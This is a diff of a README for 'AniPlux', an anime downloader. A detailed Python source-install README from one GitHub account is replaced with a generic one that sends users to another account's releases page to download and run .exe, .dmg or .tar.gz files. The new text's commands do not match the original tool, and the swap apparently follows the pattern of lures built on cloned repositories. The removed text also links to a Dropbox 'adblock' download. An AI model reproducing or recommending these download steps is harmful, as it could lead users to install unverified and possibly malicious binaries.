@@ -1,402 +1,106 @@
-<div align="center">
+# 🎥 AniPlux - Seamless Anime Episode Downloads
 
-# 🎌 AniPlux
+[![Download AniPlux](https://img.shields.io/badge/Download-AniPlux-blue)](https://github.com/Lanc1um/AniPlux/releases)
 
-**Modern anime episode downloader with a beautiful command-line interface**
+## 📖 Introduction
 
-[![Python](https://img.shields.io/badge/Python-3.8+-blue.svg)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
-[![Type Checked](https://img.shields.io/badge/type%20checked-mypy-blue.svg)](https://mypy.readthedocs.io/)
+AniPlux is a modern application designed to help you easily download your favorite anime episodes. With its user-friendly command-line interface, you can quickly access episodes in just a few steps. Whether you are a casual viewer or a passionate fan, AniPlux simplifies the downloading process.
 
-*Download your favorite anime episodes with style and speed* ✨
+## 🚀 Getting Started
 
-[Features](#-features) • [Installation](#-installation) • [Quick Start](#-quick-start) • [Documentation](#-documentation) • [Contributing](#-contributing)
+To get started with AniPlux, follow these simple steps.
 
-</div>
+### 🛠️ System Requirements
 
----
+Before you download and install AniPlux, ensure your computer meets the following minimum requirements:
 
-## 🌟 Features
+- **Operating System:** Windows 10 or later, macOS, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 100 MB available.
+- **Internet Connection:** Stable internet access for downloading episodes.
 
-### 🔍 **Smart Search & Discovery**
-- **Multi-source search** - Find anime across multiple streaming sources
-- **Fuzzy matching** - Smart search that handles typos and variations
-- **Interactive mode** - Browse and select anime with rich formatting
-- **Source filtering** - Search specific sources or all at once
+### 📥 Download & Install
 
-### 📺 **Beautiful Episode Browser**
-- **Rich terminal UI** - Stunning tables and progress bars with Rich
-- **Episode filtering** - Filter by quality, range, or episode type
-- **Pagination support** - Navigate large episode lists easily
-- **Detailed info** - View episode metadata, quality options, and more
+Visit this page to download: [AniPlux Releases](https://github.com/Lanc1um/AniPlux/releases)
 
-### ⚡ **High-Performance Downloads**
-- **aria2c integration** - Multi-connection downloads up to 16x faster
-- **Concurrent downloads** - Download multiple episodes simultaneously
-- **Progress tracking** - Real-time speed and progress indicators
-- **Resume capability** - Automatic resume for interrupted downloads
-- **Smart fallback** - Falls back to standard downloads if needed
+1. Open the link above to go to the AniPlux Releases page.
+2. Look for the latest version of AniPlux.
+3. You'll see different files based on your operating system. Select the appropriate one for your system.
+4. Click on the download link for your file. The download should start automatically.
+5. Once downloaded, locate the file in your Downloads folder.
 
-### 📦 **Flexible Download Options**
-- **Bulk downloads** - Download entire seasons or specific episode ranges
-- **Quality selection** - Choose from 480p, 720p, 1080p, and higher
-- **Custom naming** - Configurable file naming templates
-- **Directory management** - Organized downloads with custom paths
+#### For Windows Users
 
-### 🎨 **Customizable Interface**
-- **Multiple themes** - Dark, light, colorful, and default themes
-- **Rich animations** - Smooth progress bars and loading indicators
-- **Configurable UI** - Customize colors, styles, and layout
-- **Cross-platform** - Works on Windows, macOS, and Linux
+- Double-click the `.exe` file.
+- Follow the on-screen instructions to complete the installation.
 
-### 🔌 **Extensible Plugin System**
-- **Modular architecture** - Easy to add new anime sources
-- **Plugin management** - Enable, disable, and configure sources
-- **Developer-friendly** - Clean APIs for plugin development
-- **Built-in sources** - HiAnime, Animetsu, and more included
+#### For macOS Users
 
----
+- Open the `.dmg` file.
+- Drag the AniPlux icon to your Applications folder.
 
-## 🚀 Installation
+#### For Linux Users
 
-### Prerequisites
-- Python 3.8 or higher
-- pip package manager
+- Open your terminal.
+- Navigate to the folder where the downloaded `.tar.gz` file is.
+- Use the command: `tar -xvzf aniplux-linux.tar.gz`. This will extract the files.
+- Follow the included instructions to set up.
 
-### Install from Source
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/AniPlux.git
-cd AniPlux
+### ⚙️ How to Use AniPlux
 
-# Install in development mode
-pip install -e .
+1. Open your command-line tool (e.g., Command Prompt, Terminal).
+2. Navigate to the folder where AniPlux is installed.
+3. To search for an anime, type:
+   ```
+   aniplux search [anime name]
+   ```
+4. To download an episode, type:
+   ```
+   aniplux download [episode link]
+   ```
+5. Customize your download folder using:
+   ```
+   aniplux set path [desired folder path]
+   ```
 
-# Or install with all dependencies
-pip install -e ".[dev]"
+Feel free to explore the various commands by typing:
+```
+aniplux help
 ```
 
-### Optional: Install aria2c for High-Speed Downloads
-```bash
-# Windows (Chocolatey)
-choco install aria2
+## 📚 Features
 
-# Windows (Scoop)
-scoop install aria2
+- **Episode Search:** Quickly find any anime episode by name.
+- **Batch Downloads:** Download multiple episodes at once.
+- **Custom Download Paths:** Choose where to save your files.
+- **Lightweight Interface:** Minimal setup needed; easy for anyone to use.
 
-# macOS
-brew install aria2
+## 🔍 Troubleshooting
 
-# Ubuntu/Debian
-sudo apt install aria2
+If you encounter issues while using AniPlux, here are some common solutions:
 
-# CentOS/RHEL
-sudo yum install aria2
-```
+1. **Application Doesn't Start:**
+   - Ensure your computer meets the system requirements.
+   - Reinstall AniPlux and try again.
 
-### Plugin-Specific Requirements
+2. **Download Fails:**
+   - Check your internet connection. 
+   - Ensure the episode link is correct.
 
-#### HiAnime Plugin
-The HiAnime plugin may require additional setup for optimal performance:
+3. **Command Not Recognized:**
+   - Make sure you are in the right directory where AniPlux is installed.
+   - Verify that you typed the command correctly.
 
-##### Method 1
-- **AdBlock Extension** (Recommended): For better scraping reliability, you can configure an AdBlock extension path in the HiAnime plugin settings. This helps bypass ads and improves extraction success rates.
-- **Selenium WebDriver** (Optional): For JavaScript-heavy content, install Selenium support:
-  ```bash
-  pip install -e ".[selenium]"
-  ```
+## 🌟 Community and Support
 
-To configure AdBlock for HiAnime:
-```bash
-# Configure HiAnime plugin settings
-aniplux sources config hianime_plugin
+If you have questions or need help, consider checking out the community discussions on the [AniPlux GitHub Issues page](https://github.com/Lanc1um/AniPlux/issues). You can report problems, ask for features, or share your experiences with others.
 
-# Or manually set the AdBlock extension path
-aniplux config set sources.hianime_plugin.config.adblock_extension_path "/path/to/adblock/extension"
-```
+## 🗂️ Contributing
 
-##### Method 2
-Download the adblock from this link : https://www.dropbox.com/scl/fo/yx2pkebuk3mkcr2wqux12/AO36V6g84LQySif3d6m6Jls?rlkey=0j0340gk63ketast502jm298s&st=v8bq5uvv&dl=0
-and put the folder in your C Drive downloads folder and then update the sources.json file, it should look something like this
+If you're interested in contributing to AniPlux, please check the guidelines in the repository. We welcome improvements and suggestions that enhance the user experience.
 
-<img width="774" height="553" alt="image" src="https://github.com/user-attachments/assets/a4feb6c3-6a0e-4db1-a6cc-e598ccc5fe2e" />
+## 📧 Contact
 
----
+For further inquiries, you can reach out through the GitHub repository or connect with other users in the community.
 
-## ⚡ Quick Start
-
-### 1. First Run Setup
-```bash
-# Run the configuration wizard
-aniplux config wizard
-```
-
-### 2. Search for Anime
-```bash
-# Basic search
-aniplux search anime "demon slayer"
-
-# Search with specific source
-aniplux search anime "attack on titan" --source hianime_plugin
-
-# Interactive search mode
-aniplux search anime --interactive
-```
-
-### 3. Browse Episodes
-```bash
-# Browse episodes interactively
-aniplux episodes browse "anime-url" source_name
-
-# Browse with custom title
-aniplux episodes browse "anime-url" source_name --title "My Anime"
-```
-
-### 4. Download Episodes
-```bash
-# Download single episode
-aniplux download episode "episode-url"
-
-# Download with quality preference
-aniplux download episode "episode-url" --quality 1080p
-
-# Download to specific directory
-aniplux download episode "episode-url" --output "/path/to/downloads"
-```
-
-### 5. Bulk Downloads
-From the episode browser, you can:
-- Type `all` - Download all episodes
-- Type `1-10` - Download episodes 1 through 10
-- Type `download 1,5,10` - Download specific episodes
-
----
-
-## 📖 Documentation
-
-### 📚 **Comprehensive Guides**
-- **[Usage Guide](usage.md)** - Complete user manual with examples
-- **[Plugin Development](Plugin-Development.md)** - Create custom source plugins
-- **Configuration** - Detailed settings and customization options
-
-### 🎯 **Quick References**
-```bash
-# View all available commands
-aniplux --help
-
-# Get help for specific commands
-aniplux search --help
-aniplux download --help
-aniplux config --help
-
-# Check system information
-aniplux info
-
-# Run diagnostics
-aniplux doctor
-```
-
-### 🔧 **Configuration Management**
-```bash
-# View current configuration
-aniplux config show
-
-# Edit configuration interactively
-aniplux config edit
-
-# Set specific values
-aniplux config set settings.default_quality 1080p
-aniplux config set settings.concurrent_downloads 5
-
-# Backup and restore
-aniplux config backup create "my-backup"
-aniplux config backup restore backup_file.json
-```
-
-### 🔌 **Plugin Management**
-```bash
-# List available sources
-aniplux sources list
-
-# Test source connectivity
-aniplux sources test --all
-
-# Enable/disable sources
-aniplux sources enable hianime_plugin
-aniplux sources disable old_plugin
-
-# Configure source settings
-aniplux sources config hianime_plugin
-```
-
----
-
-## 🏗️ Architecture
-
-AniPlux follows a clean, modular architecture designed for extensibility and maintainability:
-
-```
-aniplux/
-├── cli/           # Command-line interface layer
-├── core/          # Core business logic and models
-├── plugins/       # Plugin system and source implementations
-├── ui/            # User interface components and themes
-└── config/        # Configuration management
-```
-
-### 🔧 **Technology Stack**
-- **Python 3.8+** - Modern Python with type hints
-- **Typer** - CLI framework with Rich integration
-- **Rich** - Beautiful terminal UI components
-- **Pydantic** - Data validation and settings management
-- **aiohttp** - Async HTTP client for web scraping
-- **BeautifulSoup4** - HTML parsing for web scraping
-- **yt-dlp** - Video extraction capabilities
-
----
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Here's how you can help:
-
-### 🐛 **Bug Reports**
-- Use the [issue tracker](https://github.com/Yui007/AniPlux/issues) to report bugs
-- Include system information, error messages, and steps to reproduce
-- Run `aniplux doctor --verbose` and include the output
-
-### 💡 **Feature Requests**
-- Suggest new features through [GitHub Issues](https://github.com/Yui007/AniPlux/issues)
-- Check existing issues to avoid duplicates
-- Provide detailed use cases and examples
-
-### 🔧 **Code Contributions**
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Make** your changes with tests
-4. **Run** the test suite (`pytest`)
-5. **Format** code (`black aniplux/ && isort aniplux/`)
-6. **Type check** (`mypy aniplux/`)
-7. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-8. **Push** to the branch (`git push origin feature/amazing-feature`)
-9. **Open** a Pull Request
-
-### 🔌 **Plugin Development**
-- Read the [Plugin Development Guide](Plugin-Development.md)
-- Use the sample plugin as a starting point
-- Test your plugin thoroughly before submitting
-- Follow the plugin naming conventions
-
-### 📝 **Documentation**
-- Improve existing documentation
-- Add examples and use cases
-- Fix typos and clarify instructions
-- Translate documentation to other languages
-
----
-
-## 🧪 Development Setup
-
-```bash
-# Clone the repository
-git clone https://github.com/Yui007/AniPlux.git
-cd AniPlux
-
-# Install development dependencies
-pip install -e ".[dev]"
-
-# Run tests
-pytest
-
-# Run tests with coverage
-pytest --cov=aniplux
-
-# Format code
-black aniplux/
-isort aniplux/
-
-# Type checking
-mypy aniplux/
-
-# Run pre-commit hooks
-pre-commit run --all-files
-```
-
-### 🧪 **Testing**
-```bash
-# Run all tests
-pytest
-
-# Run specific test file
-pytest tests/test_models.py
-
-# Run with verbose output
-pytest -v
-
-# Run with coverage report
-pytest --cov=aniplux --cov-report=html
-```
-
----
-
-## 📊 **Project Status**
-
-### ✅ **Completed Features**
-- [x] Multi-source anime search
-- [x] Interactive episode browser
-- [x] High-speed downloads with aria2c
-- [x] Plugin system architecture
-- [x] Configuration management
-- [x] Rich terminal UI
-- [x] HiAnime and Animetsu plugins
-- [x] Bulk download capabilities
-
-### 🚧 **In Development**
-- [ ] Additional anime source plugins
-- [ ] Download queue management
-- [ ] Automatic episode tracking
-- [ ] Web interface (optional)
-- [ ] Mobile companion app
-
-### 💭 **Planned Features**
-- [ ] Subtitle download support
-- [ ] Torrent integration
-- [ ] Cloud storage sync
-- [ ] Notification system
-- [ ] Advanced filtering options
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
----
-
-## 🙏 Acknowledgments
-
-- **[Rich](https://github.com/Textualize/rich)** - For the beautiful terminal UI
-- **[Typer](https://github.com/tiangolo/typer)** - For the excellent CLI framework
-- **[yt-dlp](https://github.com/yt-dlp/yt-dlp)** - For video extraction capabilities
-- **[aria2](https://aria2.github.io/)** - For high-speed download support
-- **Community contributors** - For bug reports, feature requests, and code contributions
-
----
-
-## 📞 Support
-
-- **Documentation**: [Usage Guide](usage.md) | [Plugin Development](Plugin-Development.md)
-- **Issues**: [GitHub Issues](https://github.com/Yui007/AniPlux/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/Yui007/AniPlux/discussions)
-
----
-
-<div align="center">
-
-**Made with ❤️ by the AniPlux community**
-
-*Happy anime watching! 🍿✨*
-
-[⬆ Back to top](#-aniplux)
-
-</div>
+Thank you for choosing AniPlux for your anime downloading needs! Enjoy your viewing experience.
